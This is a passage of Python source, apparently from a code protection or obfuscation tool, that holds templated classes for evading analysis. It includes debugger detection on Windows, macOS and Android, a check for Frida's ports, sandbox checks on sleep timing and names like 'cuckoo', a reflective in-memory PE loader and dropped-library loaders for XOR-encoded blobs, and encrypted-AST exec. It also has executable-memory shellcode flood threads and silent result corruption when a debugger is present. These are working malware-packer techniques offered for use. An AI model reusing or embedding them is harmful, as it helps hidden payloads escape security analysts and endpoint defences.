            rng.shuffle(opcodes)
        else:
            for i in range(255, 0, -1):
                j = _struct_randbelow(i + 1)
                opcodes[i], opcodes[j] = opcodes[j], opcodes[i]
        {ROLLING_ISA_CLS}._base_map = dict()
        for i in range(16):
            {ROLLING_ISA_CLS}._base_map[opcodes[i]] = i
    def _decode_opcode(self, raw_byte):
        shifted = (raw_byte ^ (self._context_state & 0xFF)) & 0xFF
        base_op = {ROLLING_ISA_CLS}._base_map.get(shifted)
        if base_op is not None:
            return base_op
        return {ROLLING_ISA_CLS}._base_map.get(raw_byte, -1)
    def _update_context(self, op, result):
        self._context_state = ((self._context_state * 2654435761) + op + (result & 0xFFFF) + 1) & 0xFFFFFFFF
        self._execution_history.append(self._context_state & 0xFF)
        if len(self._execution_history) > 64:
            self._execution_history = self._execution_history[-64:]
    def {METHOD_RISA_EXECUTE}(self, bytecode, max_steps=10000):
        self.pc = 0
        steps = 0
        bc = bytecode
        bc_len = len(bc)
        while not self.halted and self.pc < bc_len and steps < max_steps:
            raw_op = bc[self.pc]
            op = self._decode_opcode(raw_op)
            self.pc += 1
            steps += 1
            result = 0
            if op == 0:
                dst = bc[self.pc] % 8; val = (bc[self.pc+1] << 8) | bc[self.pc+2]
                self.registers[dst] = val
                result = val
                self.pc += 3
            elif op == 1:
                dst = bc[self.pc] % 8; src = bc[self.pc+1] % 8
                self.registers[dst] = (self.registers[dst] + self.registers[src]) & 0xFFFFFFFF
                result = self.registers[dst]
                self.pc += 2
            elif op == 2:
                dst = bc[self.pc] % 8; src = bc[self.pc+1] % 8
                self.registers[dst] ^= self.registers[src]
                result = self.registers[dst]
                self.pc += 2
            elif op == 3:
                target = (bc[self.pc] << 8) | bc[self.pc+1]
                self.pc = target
                result = target
            elif op == 4:
                dst = bc[self.pc] % 8; src = bc[self.pc+1] % 8
                self.registers[dst] = (self.registers[dst] - self.registers[src]) & 0xFFFFFFFF
                result = self.registers[dst]
                self.pc += 2
            elif op == 5:
                src = bc[self.pc] % 8
                self.stack.append(self.registers[src])
                result = self.registers[src]
                self.pc += 1
            elif op == 6:
                dst = bc[self.pc] % 8
                self.registers[dst] = self.stack.pop() if self.stack else 0
                result = self.registers[dst]
                self.pc += 1
            elif op == 7:
                dst = bc[self.pc] % 8; src = bc[self.pc+1] % 8
                self.registers[dst] = (self.registers[dst] * self.registers[src]) & 0xFFFFFFFF
                result = self.registers[dst]
                self.pc += 2
            elif op == 15:
                self.halted = True
            else:
                self.pc += 1
            self._update_context(op, result)
        return self.registers[0]
    def {METHOD_RISA_RESET}(self):
        self.registers = [0] * 8
        self.stack = []
        self.pc = 0
        self.halted = False
        self._context_state = 0
    def {METHOD_RISA_GET_CONTEXT}(self):
        return self._context_state
'''
WHITEBOX_ENHANCED_SOURCE = r'''
class {WHITEBOX_ENHANCED_CLS}:
    _tboxes = None
    _inv_tboxes = None
    _mix_keys = None
    _num_rounds = 8
    @staticmethod
    def {METHOD_WBE_INIT}(key_bytes, num_rounds=8):
        {WHITEBOX_ENHANCED_CLS}._num_rounds = num_rounds
        key_expanded = key_bytes
        while len(key_expanded) < num_rounds * 4:
            key_expanded = key_expanded + _nixon_ハッシュ해시.sha256(key_expanded).digest()
        {WHITEBOX_ENHANCED_CLS}._tboxes = []
        {WHITEBOX_ENHANCED_CLS}._inv_tboxes = []
        {WHITEBOX_ENHANCED_CLS}._mix_keys = []
        for r in range(num_rounds):
            round_key = key_expanded[r * 4:(r + 1) * 4]
            tbox = list(range(256))
            rng = random.Random(int.from_bytes(round_key, 'big') + r * 0x9E3779B9)
            rng.shuffle(tbox)
            inv_tbox = [0] * 256
            for i in range(256):
                inv_tbox[tbox[i]] = i
            {WHITEBOX_ENHANCED_CLS}._tboxes.append(bytes(tbox))
            {WHITEBOX_ENHANCED_CLS}._inv_tboxes.append(bytes(inv_tbox))
            mix = _nixon_ハッシュ해시.sha256(round_key + str(r).encode()).digest()[:16]
            {WHITEBOX_ENHANCED_CLS}._mix_keys.append(mix)
    @staticmethod
    def _mix_columns(data, mix_key):
        result = bytearray(len(data))
        for i in range(len(data)):
            result[i] = data[i] ^ mix_key[i % len(mix_key)]
        for i in range(len(result) - 1):
            result[i + 1] = (result[i + 1] + result[i]) & 0xFF
        return result
    @staticmethod
    def _inv_mix_columns(data, mix_key):
        result = bytearray(data)
        for i in range(len(result) - 1, 0, -1):
            result[i] = (result[i] - result[i - 1]) & 0xFF
        for i in range(len(result)):
            result[i] = result[i] ^ mix_key[i % len(mix_key)]
        return result
    @staticmethod
    def {METHOD_WBE_ENCRYPT}(data):
        if {WHITEBOX_ENHANCED_CLS}._tboxes is None:
            return data
        result = bytearray(data)
        for r in range({WHITEBOX_ENHANCED_CLS}._num_rounds):
            tbox = {WHITEBOX_ENHANCED_CLS}._tboxes[r]
            for i in range(len(result)):
                result[i] = tbox[result[i]]
            if r < {WHITEBOX_ENHANCED_CLS}._num_rounds - 1:
                result = {WHITEBOX_ENHANCED_CLS}._mix_columns(result, {WHITEBOX_ENHANCED_CLS}._mix_keys[r])
        return bytes(result)
    @staticmethod
    def {METHOD_WBE_DECRYPT}(data):
        if {WHITEBOX_ENHANCED_CLS}._inv_tboxes is None:
            return data
        result = bytearray(data)
        for r in range({WHITEBOX_ENHANCED_CLS}._num_rounds - 1, -1, -1):
            if r < {WHITEBOX_ENHANCED_CLS}._num_rounds - 1:
                result = {WHITEBOX_ENHANCED_CLS}._inv_mix_columns(result, {WHITEBOX_ENHANCED_CLS}._mix_keys[r])
            inv_tbox = {WHITEBOX_ENHANCED_CLS}._inv_tboxes[r]
            for i in range(len(result)):
                result[i] = inv_tbox[result[i]]
        return bytes(result)
'''
TEMPORAL_DEGRADE_SOURCE = r'''
class {TEMPORAL_DEGRADE_CLS}:
    _epsilon = 0
    _drift_count = 0
    _anomaly_detected = False
    _injection_points = dict()
    @staticmethod
    def {METHOD_TD_INJECT_ANOMALY}(severity=1):
        base_drift = 1
        for _ in range(15):
            base_drift = base_drift * 10
        epsilon = severity / base_drift
        {TEMPORAL_DEGRADE_CLS}._epsilon += epsilon
        {TEMPORAL_DEGRADE_CLS}._drift_count += 1
        {TEMPORAL_DEGRADE_CLS}._anomaly_detected = True
    @staticmethod
    def {METHOD_TD_APPLY}(value, iterations=1):
        if {TEMPORAL_DEGRADE_CLS}._epsilon == 0:
            return value
        if isinstance(value, int):
            drift = int({TEMPORAL_DEGRADE_CLS}._epsilon * (iterations * iterations))
            return value + drift
        return value
    @staticmethod
    def {METHOD_TD_COMPOUND}(value, iteration_count):
        if not {TEMPORAL_DEGRADE_CLS}._anomaly_detected:
            return value
        if isinstance(value, (int,)):
            accumulated = 0
            e = {TEMPORAL_DEGRADE_CLS}._epsilon
            for i in range(min(iteration_count, 1000)):
                accumulated += int(e * (i + 1))
                e = e * 2
            return value + accumulated
        return value
    @staticmethod
    def {METHOD_TD_CHECK_ENV}():
        anomaly_score = 0
        try:
            import sys as _s
            if _s.gettrace() is not None:
                anomaly_score += 3
        except: pass
        try:
            t1 = _nixon_時間시간.perf_counter_ns() if hasattr(_nixon_時間시간, 'perf_counter_ns') else int(_nixon_時間시간.perf_counter() * 1000000000)
            total = 0
            for i in range(10000):
                total += i
            t2 = _nixon_時間시간.perf_counter_ns() if hasattr(_nixon_時間시간, 'perf_counter_ns') else int(_nixon_時間시간.perf_counter() * 1000000000)
            delta = t2 - t1
            if delta > 100000000:
                anomaly_score += 2
        except: pass
        if anomaly_score > 0:
            {TEMPORAL_DEGRADE_CLS}.{METHOD_TD_INJECT_ANOMALY}(anomaly_score)
        return anomaly_score
    @staticmethod
    def {METHOD_TD_IS_DEGRADED}():
        return {TEMPORAL_DEGRADE_CLS}._anomaly_detected
'''
CODE_BLOAT_SOURCE = r'''
class {CODE_BLOAT_CLS}:
    _generated_functions = dict()
    _bloat_seed = None
    @staticmethod
    def {METHOD_CB_INIT}(seed=None):
        {CODE_BLOAT_CLS}._bloat_seed = seed or _nixon_オペレーション운영.urandom(16)
    @staticmethod
    def {METHOD_CB_GENERATE}(count=50):
        rng = random.Random(int.from_bytes({CODE_BLOAT_CLS}._bloat_seed or _nixon_オペレーション운영.urandom(8), 'big'))
        def _mk(idx, sd):
            pfx = ['_nx_calc_', '_nx_auth_', '_nx_parse_', '_nx_crypto_', '_nx_vault_']
            t = idx % 5
            name = pfx[t] + str(idx) + '_' + str(sd)
            n = rng.randint(100, 10000); m = rng.randint(1, 100); k = rng.randint(0, 255)
            lim = rng.randint(100000, 9999999); md = rng.randint(1000, 99999)
            sa = rng.randint(100000, 999999); tg = rng.randint(0, 0xFFFFFFFF)
            bs = rng.randint(32, 512); st = rng.randint(2, 16); xk = rng.randint(0, 255)
            ks = format(rng.randint(0, 2**64), 'x')
            ps = rng.randint(16, 256); vc = rng.randint(10, 100)
            vs = rng.randint(0, 99999); vm = rng.randint(1, 50); va = rng.randint(0, 1000)
            if t == 0:
                return 'def ' + name + '():\n    total = 0\n    for i in range(' + str(n) + '):\n        total += i * ' + str(m) + ' + ' + str(k) + '\n        if total > ' + str(lim) + ': total = total % ' + str(md) + '\n    return total'
            elif t == 1:
                return 'def ' + name + '(token=None):\n    h = _nixon_ハッシュ해시.sha256(str(token or ' + str(sa) + ').encode()).hexdigest()\n    parts = [h[i:i+8] for i in range(0, len(h), 8)]\n    combined = 0\n    for p in parts: combined ^= int(p, 16)\n    return combined == ' + str(tg)
            elif t == 2:
                return 'def ' + name + '(data=None):\n    buf = data or b"\\x00" * ' + str(bs) + '\n    result = []\n    for i in range(0, len(buf), ' + str(st) + '):\n        chunk = buf[i:i+' + str(st) + ']\n        val = sum(chunk) ^ ' + str(xk) + '\n        result.append(val & 0xFF)\n    return bytes(result)'
            elif t == 3:
                return 'def ' + name + '(payload=None):\n    key = _nixon_ハッシュ해시.sha256(b"' + ks + '").digest()\n    if payload is None: payload = b"\\x00" * ' + str(ps) + '\n    out = bytearray(len(payload))\n    for i in range(len(payload)):\n        out[i] = payload[i] ^ key[i % 32]\n    return bytes(out)'
            else:
                return 'def ' + name + '(master=None):\n    vault = dict()\n    for i in range(' + str(vc) + '):\n        k = _nixon_ハッシュ해시.md5(str(i + ' + str(vs) + ').encode()).hexdigest()[:8]\n        v = i * ' + str(vm) + ' + ' + str(va) + '\n        vault[k] = v\n    if master: return vault.get(_nixon_ハッシュ해시.md5(str(master).encode()).hexdigest()[:8])\n    return None'
        generated = []
        for idx in range(count):
            seed_hex = rng.randint(100000, 999999)
            code = _mk(idx, seed_hex)
            generated.append(code)
            {CODE_BLOAT_CLS}._generated_functions['_nx_calc_' + str(idx) + '_' + str(seed_hex)] = code
        ns = dict()
        for code in generated:
            try:
                exec(code, ns)
            except: pass
        return len(generated)
    @staticmethod
    def {METHOD_CB_COUNT}():
        return len({CODE_BLOAT_CLS}._generated_functions)
'''
CROSS_PLATFORM_GUARD_SOURCE = r'''
class {CROSS_PLATFORM_GUARD_CLS}:
    @staticmethod
    def {METHOD_WIN_DEBUG_BLOCK}():
        try:
            import ctypes, sys, os
            kernel32 = ctypes.windll.kernel32
            if kernel32.IsDebuggerPresent(): return True
            is_debug = ctypes.c_bool(False)
            kernel32.CheckRemoteDebuggerPresent(kernel32.GetCurrentProcess(), ctypes.byref(is_debug))
            if is_debug.value: return True
            ntdll = ctypes.windll.ntdll
            process_debug_port = ctypes.c_uint64(0)
            status = ntdll.NtQueryInformationProcess(kernel32.GetCurrentProcess(), 7, ctypes.byref(process_debug_port), ctypes.sizeof(process_debug_port), None)
            if status == 0 and process_debug_port.value != 0: return True
        except: pass
        return False
    @staticmethod
    def {METHOD_MAC_DENY_ATTACH}():
        try:
            import ctypes
            import ctypes.util
            libc_path = ctypes.util.find_library("c")
            libc = ctypes.CDLL(libc_path)
            libc.ptrace(31, 0, 0, 0)
        except: pass
        return False
    @staticmethod
    def {METHOD_ANDROID_TRACE_SCAN}():
        try:
            import os
            my_pid = os.getpid()
            tracer_pid = 0
            with open("/proc/self/status", "r") as f:
                for line in f:
                    if line.startswith("TracerPid:"):
                        tracer_pid = int(line.split(":")[1].strip())
                        break
            if tracer_pid != 0:
                nano_pid_str = os.environ.get('_NX_NANO_PID', '')
                if not (nano_pid_str and str(tracer_pid) == nano_pid_str):
                    return True
            import socket
            for port in [27042, 27043]:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.1)
                    if s.connect_ex(("127.0.0.1", port)) == 0:
                        s.close()
                        return True
                    s.close()
                except: pass
        except: pass
        return False
    @staticmethod
    def {METHOD_UNIVERSAL_GUARD}():
        import platform, os
        sys_plat = platform.system().lower()
        detected = False
        if "windows" in sys_plat:
            detected = {CROSS_PLATFORM_GUARD_CLS}.{METHOD_WIN_DEBUG_BLOCK}()
        elif "darwin" in sys_plat:
            detected = {CROSS_PLATFORM_GUARD_CLS}.{METHOD_MAC_DENY_ATTACH}()
        elif "linux" in sys_plat:
            if os.path.exists("/system/build.prop") or os.path.exists("/data/data/com.termux"):
                detected = {CROSS_PLATFORM_GUARD_CLS}.{METHOD_ANDROID_TRACE_SCAN}()
            else:
                pass
        return detected
'''
ATTRITION_WARFARE_SOURCE = r'''
class {ATTRITION_CLS}:
    _entropy_thread = None
    _stop_entropy = False
    _prev_state = 0
    @staticmethod
    def {METHOD_LOG_EXPLOSION}():
        def _noise_generator():
            try:
                buf_size = 64 * 1024 * 1024
                if _nixon_プラットフォーム플랫폼.system() == "Linux":
                    with open("/dev/urandom", "rb") as f:
                        while not {ATTRITION_CLS}._stop_entropy:
                            _ = f.read(buf_size)
                else:
                    while not {ATTRITION_CLS}._stop_entropy:
                        _ = _nixon_オペレーション운영.urandom(buf_size)
            except: pass
        for _ in range(8):
            _nixon_スレッディング스레딩.Thread(target=_noise_generator, daemon=True).start()
    @staticmethod
    def {METHOD_PROOF_OF_WORK}(difficulty=4):
        prefix = _nixon_オペレーション운영.urandom(8).hex()
        nonce = 0
        target = "0" * difficulty
        while True:
            h = _nixon_ハッシュ해시.sha256((prefix + str(nonce)).encode()).hexdigest()
            if h.startswith(target):
                return nonce
            nonce += 1
            if nonce > 1000000: break
        return nonce
    @staticmethod
    def {METHOD_STATEFUL_ENTANGLE}(input_val):
        current_state = {ATTRITION_CLS}._prev_state
        new_state = _nixon_ハッシュ해시.sha256(str(current_state).encode() + str(input_val).encode()).digest()
        {ATTRITION_CLS}._prev_state = int.from_bytes(new_state[:8], 'little')
        return int.from_bytes(new_state[8:16], 'little')
    @staticmethod
    def {METHOD_RDTSC_FLOOD}():
        def _spam_rdtsc():
            try:
                import ctypes, mmap
                machine = _nixon_プラットフォーム플랫폼.machine().lower()
                if 'x86' in machine or 'amd64' in machine:
                    code = b'\x48\xB9\x00\xE1\xF5\x05\x00\x00\x00\x00\x0F\x31\x48\xFF\xC9\x75\xFB\xC3'
                    prot = mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC
                    flags = mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS
                    mm = mmap.mmap(-1, len(code), flags=flags, prot=prot)
                    mm.write(code)
                    func = ctypes.CFUNCTYPE(None)(ctypes.addressof(ctypes.c_int.from_buffer(mm)))
                    while not {ATTRITION_CLS}._stop_entropy:
                        func()
                else:
                    while not {ATTRITION_CLS}._stop_entropy:
                        _ = _nixon_時間시간.perf_counter_ns()
            except: pass
        for _ in range(4):
            _nixon_スレッディング스레딩.Thread(target=_spam_rdtsc, daemon=True).start()
'''
JIT_AST_SOURCE = r'''
class {JIT_AST_CLS}:
    def __init__(self, encryption_key):
        self._key = encryption_key
        self._ast_cache = {}
        self._compile_count = 0
    def {METHOD_ENCRYPT_AST}(self, source_code):
        try:
            tree = _nixon_アスト추상구문트리.parse(source_code)
            ast_dump = _nixon_アスト추상구문트리.dump(tree)
            ast_bytes = ast_dump.encode('utf-8')
            k_h = _nixon_ハッシュ해시.sha256(self._key).digest()
            encrypted = bytearray(ast_bytes)
            for i in range(len(encrypted)):
                if i % 32 == 0:
                    k_h = _nixon_ハッシュ해시.sha256(k_h + i.to_bytes(4, 'little')).digest()
                encrypted[i] ^= k_h[i % 32]
            return bytes(encrypted)
        except:
            return None
    def {METHOD_JIT_COMPILE}(self, encrypted_ast, randomize_names=True):
        self._compile_count += 1
        try:
            k_h = _nixon_ハッシュ해시.sha256(self._key).digest()
            decrypted = bytearray(encrypted_ast)
            for i in range(len(decrypted)):
                if i % 32 == 0:
                    k_h = _nixon_ハッシュ해시.sha256(k_h + i.to_bytes(4, 'little')).digest()
                decrypted[i] ^= k_h[i % 32]
            ast_dump = bytes(decrypted).decode('utf-8')
            tree = _nixon_アスト추상구문트리.parse(ast_dump.split("Module(body=")[1].rsplit(")", 1)[0] if "Module(body=" in ast_dump else "pass")
            if randomize_names:
                tree = self._randomize_vars(tree)
            code = compile(tree, '<jit>', 'exec')
            _nixon_ガベージ가비지.collect()
            return code
        except:
            return None
    def _randomize_vars(self, tree):
        class VarRandomizer(_nixon_アスト추상구문트리.NodeTransformer):
            def __init__(self):
                self.remap = {}
            def visit_Name(self, node):
                if node.id not in ['True', 'False', 'None'] and not node.id.startswith('_'):
                    if node.id not in self.remap:
                        self.remap[node.id] = f"_jv{len(self.remap)}_{_nixon_シークレット시크릿.token_hex(3)}"
                    node.id = self.remap.get(node.id, node.id)
                return node
        try:
            randomizer = VarRandomizer()
            tree = randomizer.visit(tree)
            _nixon_アスト추상구문트리.fix_missing_locations(tree)
        except: pass
        return tree
    def {METHOD_EXEC_JIT}(self, encrypted_ast, globals_dict=None):
        code = self.{METHOD_JIT_COMPILE}(encrypted_ast)
        if code is None:
            return None
        ns = globals_dict if globals_dict else {}
        try:
            exec(code, ns)
        finally:
            del code
            _nixon_ガベージ가비지.collect()
        return ns
'''
BYTECODE_PAGING_SOURCE = r'''
class {BYTECODE_PAGING_CLS}:
    PAGE_SIZE = 16
    def __init__(self, page_key):
        self._key = page_key
        self._pages = {}
        self._page_table = {}
        self._active_pages = {}
        self._max_active = 3
        self._instruction_count = 0
    def {METHOD_LOAD_BYTECODE}(self, bytecode):
        num_pages = (len(bytecode) + self.PAGE_SIZE - 1) // self.PAGE_SIZE
        page_order = list(range(num_pages))
        _nixon_ランダム무작위.shuffle(page_order)
        for logical_idx in range(num_pages):
            start = logical_idx * self.PAGE_SIZE
            end = min(start + self.PAGE_SIZE, len(bytecode))
            page_data = bytecode[start:end]
            physical_idx = page_order[logical_idx]
            encrypted = self._encrypt_page(page_data, logical_idx)
            self._pages[physical_idx] = encrypted
            self._page_table[logical_idx] = physical_idx
        self._encrypt_page_table()
    def _encrypt_page(self, data, page_idx):
        k = _nixon_ハッシュ해시.sha256(self._key + page_idx.to_bytes(4, 'little')).digest()
        return bytes([b ^ k[i % 32] for i, b in enumerate(data)])
    def _decrypt_page(self, data, page_idx):
        return self._encrypt_page(data, page_idx)
    def _encrypt_page_table(self):
        table_bytes = _nixon_ジェイソン제이슨.dumps(self._page_table).encode()
        k = _nixon_ハッシュ해시.sha256(self._key + b'TABLE').digest()
        self._encrypted_table = bytes([b ^ k[i % 32] for i, b in enumerate(table_bytes)])
        self._page_table = None
    def _decrypt_page_table(self):
        if self._page_table is None:
            k = _nixon_ハッシュ해시.sha256(self._key + b'TABLE').digest()
            table_bytes = bytes([b ^ k[i % 32] for i, b in enumerate(self._encrypted_table)])
            self._page_table = _nixon_ジェイソン제이슨.loads(table_bytes.decode())
    def {METHOD_FETCH_PAGE}(self, logical_idx):
        self._instruction_count += 1
        if self._instruction_count % 1000 == 0:
            self._shuffle_page_table()
        if logical_idx in self._active_pages:
            return self._active_pages[logical_idx]
        self._decrypt_page_table()
        physical_idx = self._page_table.get(str(logical_idx), self._page_table.get(logical_idx))
        if physical_idx is None:
            return None
        encrypted = self._pages.get(physical_idx)
        if encrypted is None:
            return None
        decrypted = self._decrypt_page(encrypted, logical_idx)
        if len(self._active_pages) >= self._max_active:
            oldest_key = next(iter(self._active_pages))
            del self._active_pages[oldest_key]
        self._active_pages[logical_idx] = decrypted
        return decrypted
    def _shuffle_page_table(self):
        self._decrypt_page_table()
        new_order = list(self._pages.keys())
        _nixon_ランダム무작위.shuffle(new_order)
        new_pages = {}
        new_table = {}
        for logical_idx, old_physical in self._page_table.items():
            new_physical = new_order.pop()
            new_pages[new_physical] = self._pages[old_physical]
            new_table[logical_idx] = new_physical
        self._pages = new_pages
        self._page_table = new_table
        self._encrypt_page_table()
        self._active_pages.clear()
    def {METHOD_CLEAR_ACTIVE}(self):
        self._active_pages.clear()
        _nixon_ガベージ가비지.collect()
'''
NATIVE_LOADER_SOURCE = r'''class {NATIVE_BLOB}_Loader:
    @staticmethod
    def {METHOD_LOAD}(blob_dict):
        system = _nixon_プラットフォーム플랫폼.system().lower()
        is_android = "android" in system or _nixon_オペレーション운영.path.exists("/data/data/com.termux")
        if "windows" in system and blob_dict.get("windows"):
            data = _nixon_ベース베이스.b64decode(blob_dict["windows"])
            data = bytes([b ^ BLOB_KEY[i % len(BLOB_KEY)] for i, b in enumerate(data)])
            return {NATIVE_BLOB}_Loader.{METHOD_LOAD_PE}(data)
        elif is_android and blob_dict.get("android"):
            data = _nixon_ベース베이스.b64decode(blob_dict["android"])
            data = bytes([b ^ BLOB_KEY[i % len(BLOB_KEY)] for i, b in enumerate(data)])
            return {NATIVE_BLOB}_Loader.{METHOD_LOAD_ELF}(data)
        elif "linux" in system and blob_dict.get("linux"):
            data = _nixon_ベース베이스.b64decode(blob_dict["linux"])
            data = bytes([b ^ BLOB_KEY[i % len(BLOB_KEY)] for i, b in enumerate(data)])
            return {NATIVE_BLOB}_Loader.{METHOD_LOAD_ELF}(data)
        elif "darwin" in system and blob_dict.get("darwin"):
            data = _nixon_ベース베이스.b64decode(blob_dict["darwin"])
            data = bytes([b ^ BLOB_KEY[i % len(BLOB_KEY)] for i, b in enumerate(data)])
            return {NATIVE_BLOB}_Loader.{METHOD_LOAD_DYLIB}(data)
        return None
    @staticmethod
    def {METHOD_LOAD_DYLIB}(data):
        try:
            td = _nixon_オペレーション운영.path.expanduser("~/.local/share")
            if not _nixon_オペレーション운영.path.exists(td): td = None
            fd, path = _nixon_テンプ임시.mkstemp(suffix='.dylib', dir=td)
            _nixon_オペレーション운영.write(fd, data)
            _nixon_オペレーション운영.close(fd)
            h = _nixon_シータイプ씨타입.CDLL(path)
            try: _nixon_オペレーション운영.unlink(path)
            except: pass
            return h
        except: return None
    @staticmethod
    def {METHOD_LOAD_ELF}(data):
        try:
            import importlib.util, tempfile, os, sys, types
            td = os.path.expanduser("~/.local/share")
            if not os.path.exists(td): td = None
            fd, path = tempfile.mkstemp(suffix='.so', dir=td)
            os.write(fd, data)
            os.close(fd)
            spec = importlib.util.spec_from_file_location("payload", path)
            mod = importlib.util.module_from_spec(spec)
            sys.modules["payload"] = mod
            spec.loader.exec_module(mod)
            try: os.unlink(path)
            except: pass
            return mod
        except: return None
    @staticmethod
    def {METHOD_LOAD_PE}(data):
        try:
            k32 = _nixon_シータイプ씨타입.windll.kernel32
            e_lfanew = _nixon_構造구조.unpack_from("<I", data, 0x3C)[0]
            op_hdr = e_lfanew + 24
            magic = _nixon_構造구조.unpack_from("<H", data, op_hdr)[0]
            if magic != 0x20B: return None
            sz_img = _nixon_構造구조.unpack_from("<I", data, op_hdr + 56)[0]
            sz_hdrs = _nixon_構造구조.unpack_from("<I", data, op_hdr + 60)[0]
            entry_rva = _nixon_構造구조.unpack_from("<I", data, op_hdr + 16)[0]
            base_orig = _nixon_構造구조.unpack_from("<Q", data, op_hdr + 24)[0]
            k32.VirtualAlloc.restype = _nixon_シータイプ씨타입.c_void_p
            k32.VirtualAlloc.argtypes = [_nixon_シータイプ씨타입.c_void_p, _nixon_シータイプ씨타입.c_size_t, _nixon_シータイプ씨타입.c_uint, _nixon_シータイプ씨타입.c_uint]
            base = k32.VirtualAlloc(None, sz_img, 0x3000, 0x40)
            if not base: return None
            _nixon_シータイプ씨타입.memmove(base, data, sz_hdrs)
            n_sect = _nixon_構造구조.unpack_from("<H", data, e_lfanew + 6)[0]
            sect_ptr = op_hdr + _nixon_構造구조.unpack_from("<H", data, e_lfanew + 20)[0]
            for i in range(n_sect):
                off = sect_ptr + (i * 40)
                v_addr = _nixon_構造구조.unpack_from("<I", data, off + 12)[0]
                r_sz = _nixon_構造구조.unpack_from("<I", data, off + 16)[0]
                r_ptr = _nixon_構造구조.unpack_from("<I", data, off + 20)[0]
                if r_sz > 0: _nixon_シータイプ씨타입.memmove(base + v_addr, data[r_ptr:r_ptr+r_sz], r_sz)
            delta = base - base_orig
            if delta != 0:
                reloc_rva = _nixon_構造구조.unpack_from("<I", data, op_hdr + 152)[0]
                reloc_sz = _nixon_構造구조.unpack_from("<I", data, op_hdr + 156)[0]
                if reloc_rva and reloc_sz:
                    offset = 0
                    while offset < reloc_sz:
                        page_rva = _nixon_構造구조.unpack_from("<I", data, reloc_rva + offset)[0]
                        block_sz = _nixon_構造구조.unpack_from("<I", data, reloc_rva + offset + 4)[0]
                        if block_sz == 0: break
                        num_entries = (block_sz - 8) // 2
                        for j in range(num_entries):
                            entry = _nixon_構造구조.unpack_from("<H", data, reloc_rva + offset + 8 + j*2)[0]
                            e_type = entry >> 12
                            e_off = entry & 0xFFF
                            if e_type == 10:
                                addr = base + page_rva + e_off
                                val = _nixon_シータイプ씨타입.cast(addr, _nixon_シータイプ씨타입.POINTER(_nixon_シータイプ씨타입.c_uint64))[0]
                                _nixon_シータイプ씨타입.cast(addr, _nixon_シータイプ씨타입.POINTER(_nixon_シータイプ씨타입.c_uint64))[0] = val + delta
                        offset += block_sz
            return base + entry_rva
        except Exception: return None'''
ANTI_DECOMPILER_SOURCE = r'''
class {ANTI_DECOMPILER_CLS}:
    @staticmethod
    def {METHOD_BREAK_CFG}():
        if False:
            while True:
                for i in range(2**32):
                    pass
                break
        try:
            if 0:
                raise RuntimeError()
        except:
            pass
        finally:
            pass
    @staticmethod
    def {METHOD_FAKE_IMPORTS}():
        try:
            pass
        except:
            pass
    @staticmethod
    def {METHOD_MASSIVE_EXPR}(x):
        return (((x ^ 0x55) + 1) * 2 - 1) // 2 ^ (((x & 0xFF) | (x >> 8)) & ((x << 1) ^ (x >> 1))) ^ \
               (((x + 0x1234) ^ 0x5678) & 0xFFFF) | (((x - 0x9ABC) ^ 0xDEF0) >> 4) ^ \
               (((x * 3) ^ (x // 2)) & ((x | 0xFF00) ^ (x & 0x00FF)))
'''
ANTI_SANDBOX_SOURCE = r'''
class {ANTI_SANDBOX_CLS}:
    @staticmethod
    def {METHOD_CHECK_SLEEP_ACCEL}():
        try:
            start = _nixon_時間시간.time()
            _nixon_時間시간.sleep(2.05)
            end = _nixon_時間시간.time()
            if (end - start) < 1.9: return True 
        except: pass
        return False
    @staticmethod
    def {METHOD_CHECK_RESOURCES}():
        try:
            if _nixon_オペレーション운영.cpu_count() < 2: return True
            if _nixon_プラットフォーム플랫폼.system() == "Linux":
                try:
                    with open("/proc/meminfo", "r") as f:
                        for line in f:
                            if "MemTotal" in line:
                                kb = int(line.split()[1])
                                if kb < 2000000: pass
                                break
                except: pass
        except: pass
        return False
    @staticmethod
    def {METHOD_CHECK_USERNAMES}():
        banned_users = ["sandbox", "malware", "virus", "test", "sample", "analysis", "currentuser", "admin", "user"]
        banned_hosts = ["sandbox", "sample", "cuckoo", "vm", "test", "analysis"]
        try:
            user = _nixon_オペレーション운영.environ.get("USER", "").lower() or _nixon_オペレーション운영.environ.get("USERNAME", "").lower()
            host = _nixon_ソケット소켓.gethostname().lower()
            if user in banned_users: return True
            for b in banned_hosts:
                if b in host: return True
        except: pass
        return False
    @staticmethod
    def {METHOD_FULL_SANDBOX_CHECK}():
        score = 0
        if {ANTI_SANDBOX_CLS}.{METHOD_CHECK_SLEEP_ACCEL}(): score += 5
        if {ANTI_SANDBOX_CLS}.{METHOD_CHECK_RESOURCES}(): score += 2
        if {ANTI_SANDBOX_CLS}.{METHOD_CHECK_USERNAMES}(): score += 2
        return score >= 5
'''
PROGRESSIVE_DECRYPT_SOURCE = r'''
class {PROGRESSIVE_DECRYPT_CLS}:
    def __init__(self, layer_count=5):
        self._layers = layer_count
        self._layer_keys = []
        self._auth_proofs = []
    def {METHOD_INIT_LAYERS}(self, master_key):
        current = master_key
        for i in range(self._layers):
            layer_key = _nixon_ハッシュ해시.sha256(current + f"LAYER_{i}".encode()).digest()
            auth_proof = _nixon_ハッシュ해시.sha256(layer_key + b"AUTH").hexdigest()[:16]
            self._layer_keys.append(layer_key)
            self._auth_proofs.append(auth_proof)
            current = layer_key
    def {METHOD_WRAP_DATA}(self, data):
        current = data
        for i in range(self._layers - 1, -1, -1):
            layer_data = self._auth_proofs[i].encode() + current
            k = self._layer_keys[i]
            encrypted = bytearray(layer_data)
            for j in range(len(encrypted)):
                encrypted[j] ^= k[j % 32]
            current = bytes(encrypted)
        return current
    def {METHOD_UNWRAP_LAYER}(self, data, layer_idx, provided_auth=None):
        if layer_idx >= self._layers:
            return None
        k = self._layer_keys[layer_idx]
        decrypted = bytearray(data)
        for j in range(len(decrypted)):
            decrypted[j] ^= k[j % 32]
        decrypted = bytes(decrypted)
        expected_auth = self._auth_proofs[layer_idx].encode()
        if not decrypted.startswith(expected_auth):
            return None
        return decrypted[len(expected_auth):]
    def {METHOD_FULL_UNWRAP}(self, data, auth_chain=None):
        current = data
        for i in range(self._layers):
            current = self.{METHOD_UNWRAP_LAYER}(current, i)
            if current is None:
                return None
        return current
'''
WATERMARK_SOURCE = r'''
class {WATERMARK_CLS}:
    def __init__(self, build_id):
        self._id = build_id
        self._hash = _nixon_ハッシュ해시.sha256(build_id.encode() if isinstance(build_id, str) else build_id).digest()
    def {METHOD_INFLUENCE_VM}(self, base_map):
